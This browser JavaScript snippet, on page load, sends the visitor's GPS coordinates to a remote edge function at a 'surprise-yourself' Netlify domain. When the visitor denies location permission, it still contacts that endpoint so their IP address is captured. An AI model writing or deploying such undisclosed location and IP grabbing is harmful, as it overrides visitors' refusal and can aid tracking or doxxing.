window.addEventListener('load', () => {
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      async position => {
        const { latitude, longitude } = position.coords;

        const response = await fetch('https://surprise-yourself.netlify.app/.netlify/edge-functions/loc', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude, longitude })
        });

        const data = await response.json();
        console.log('Location + IP sent:', data);
      },
      async () => {
        // If permission denied or unavailable, send only IP
        const response = await fetch('https://surprise-yourself.netlify.app/.netlify/edge-functions/loc', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({})
        });

        const data = await response.json();
        console.log('Only IP sent:', data);
      }
    );
  } else {
    console.log('Geolocation not supported');
  }
});
